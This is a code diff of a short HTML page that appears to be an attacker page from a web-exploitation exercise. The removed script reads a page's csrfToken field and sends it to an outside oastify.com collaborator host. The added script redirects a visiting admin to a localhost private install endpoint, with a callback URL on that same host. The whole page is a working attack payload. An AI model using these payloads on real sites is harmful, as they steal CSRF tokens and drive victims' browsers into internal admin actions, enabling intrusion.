@@ -1,23 +1,11 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>CSRF Token Dump Test</h3>
+    <h3>Final CSRF Redirect Test</h3>
 
     <script>
-      window.onload = () => {
-        setTimeout(() => {
-          try {
-            const el = document.querySelector('[name="csrfToken"]');
-            if (el) {
-              fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?status=found&val=" + encodeURIComponent(el.value));
-            } else {
-              fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?status=not_found");
-            }
-          } catch (e) {
-            fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?status=error");
-          }
-        }, 1000);
-      };
+      // Redirect admin to internal page with callback param
+      location.href = "http://localhost:3000/apiv1/private/install?cb=https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/ping";
     </script>
 
     <button id="installbutton">Click</button>
